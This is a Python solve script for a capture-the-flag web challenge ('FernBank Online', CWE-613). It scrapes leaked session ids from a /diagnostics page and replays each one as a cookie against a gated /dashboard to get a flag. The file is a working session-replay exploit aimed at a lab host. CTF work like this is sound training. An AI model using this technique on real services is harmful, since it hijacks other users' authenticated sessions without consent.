#!/usr/bin/env python3
"""
FernBank Online (auth, 100) — CWE-613, insufficient session expiration.

The /diagnostics "session trace" leaks manager session ids that were "closed by
client" (logged out) but never invalidated server-side. The `sid` cookie is a
raw 32-hex id, so we replay a leaked one against the gated /dashboard.

Usage:
    python3 solve.py                          # defaults to auth14.chal.deti:8073
    python3 solve.py http://auth14.chal.deti:8073
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth14.chal.deti:8073"
DIAGNOSTICS = f"{BASE}/diagnostics"
DASHBOARD = f"{BASE}/dashboard"

SID_RE = re.compile(r"\b[0-9a-f]{32}\b")
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    trace = requests.get(DIAGNOSTICS, timeout=10).text
    sids = list(dict.fromkeys(SID_RE.findall(trace)))  # de-duped, in order
    print(f"[i] {len(sids)} leaked session ids in /diagnostics")

    for sid in sids:
        r = requests.get(DASHBOARD, cookies={"sid": sid}, timeout=10)
        m = FLAG_RE.search(r.text)
        if m:
            print(f"[+] sid {sid} is still valid -> {m.group(0)}")
            return 0

    print("[-] no leaked session id returned a flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
